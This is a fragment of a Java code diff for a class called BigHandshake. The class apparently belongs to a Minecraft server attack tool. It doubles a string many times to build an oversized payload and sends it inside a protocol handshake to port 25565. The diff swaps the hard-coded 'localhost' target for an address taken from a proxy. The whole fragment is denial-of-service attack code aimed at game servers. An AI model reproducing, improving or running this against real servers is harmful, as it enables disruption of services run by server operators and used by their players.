@@ -17,7 +17,7 @@ public class BigHandshake implements IMethod {
 
   public BigHandshake() {
     for (int i = 1; i < this.a + 1; i++)
-      this.lol = String.valueOf(this.lol) + String.valueOf(this.lol);
+      this.lol += String.valueOf(this.lol);
   }
   
   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
@@ -37,7 +37,7 @@ public class BigHandshake implements IMethod {
       out.writeByte(0);
       out.writeBytes(this.lol);
       out.writeByte(9);
-      out.writeBytes("localhost");
+      out.writeBytes(proxy.addrs.getHostName());
       out.writeShort(25565);
       out.writeByte(1);
       out.close();
